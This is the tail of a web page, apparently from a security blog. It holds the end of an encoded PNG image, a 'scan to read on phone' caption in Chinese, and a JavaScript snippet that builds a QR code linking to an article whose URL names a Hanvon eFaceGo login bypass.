JpzpO8Wshp66T9zB7aFQLYNQU8PM+9b7dy+jjDP0T/rh/SZg/DeX74aJFNaVdflz2LNqOr50sbSh+Pz63eE5IHrB1S3N/vYvpe1ui6fAH3INuUiHOv6fY56R3OQefKeO+JmRTOQWWfcPrHnYZ7TfbkIx3n9I9z+yDoyL+3n78CXF+LTI/ZLhjwVENSHcDjGs3nOEeF4Duz1Plsu9pkrri5CzuUcCNfvOsx+z1X+ywtxyIV/5w5sC6ntjLU6HWTLMOMq33XP0XXIvK53vuqvnF5HyGx1CK+eKvU6Pip98ShTmr5YWpVcLG1V20JWgUv/2TuwXIjbhDxN8hV62d3vOmRe1+070yH95sVCiAczllfVZ8PjnHmYc+o1s0oOcw7C9VcIyQHX1yG3N/vYvUPgvi24/2diMOu+DoheT0qVulhaFcy50qrMQXy5CMe6/og176ggM2BGs+OMOobk6viZguRX81YzYO6r/t1CVs2X/jN3YPt5SD9dbavqTK9MlTnI1juvTFXXIfnyqvRXWJkqSB/csfdAvMqPZQ7id25WXew6pF8dws2LEB2C6vbJC693SN2FN6rte1mQ7R1tbbxeSA6CejBzdedBfAiqm3sWIf3mnVOoBsmUVgXhEDRXXpW8Y3ljdb/zMTser3JdL369Q+ouvFHtFgJ5iiDotY4bH4+7L4fj/u47q+uQ/u6bEyE5QGn7HxoDnz/7Xs2A+Db2HMSHGXse4qtDOATV+3x1SA64vg65vdnHlz/Lgmyzvw6YdZ8GONbth9lXt18Oxzn9QkgGgn1GZarUxdLGgvTfbqN6P/5u331CjiDncV7h7o+sRK/fX3UHts+yajtjrS7IjD7st1wZmPWel1e2CpJXh5lXpkq/jldlBjIDguorhMc5z2c/zHn9jmd5/cLrHVJ34Y1q+zsEsm14Ds9eg0+JOchcuT5El3eE+PZ1hPhAtzbuzE1oByt/pdu+8oHPz+7MdYS1f71D+t16Md8W4rbPcHW9sN569Ti3jqsg+a6XN9azfuXGvvEYHp8LZr9mVUF0Z0E4zKgvVm+VXCytSg7zHOD6OuT2Zh/bO8Trgv3WAO0l1uargOnPTwiHYGWqHATRYcbuy0WY83DnZsQ6XxXcM4D2DoHP11A9VQbq+Kj0IX0wY/fl4jhztxBDF77mDvz2Qtwu5KnoL0Nf1JeLXYfjeeZE+wuPtNIhs+p4LIhun2gG4sv1IToEu29O7L5chMwBrr9Dbm/28dvvkP563Lo63LcPKJ/iao66OA460kbfY+Dz7wi5CLPuPJh18yLMvn36HeE4X31/fCH95Bf/2h3YLaS2dFTPjoV5+/Y5E+LDjCvffhHmPvVCOPb67MpWqddxlRyO50D0ylaZr+Oqzkt7VDDPq+xuISVe9bo7sC0Esi14jKtL9ekQzT3LIee1r6NzRH1IH6C0Q2D6O6PP2DUsBPtEY513HXL+VQ7iA9dnWbc3+9jeIW92Xf/by/kPAAD//8CFFG4AAAAGSURBVAMATlBxrT9W/TIAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 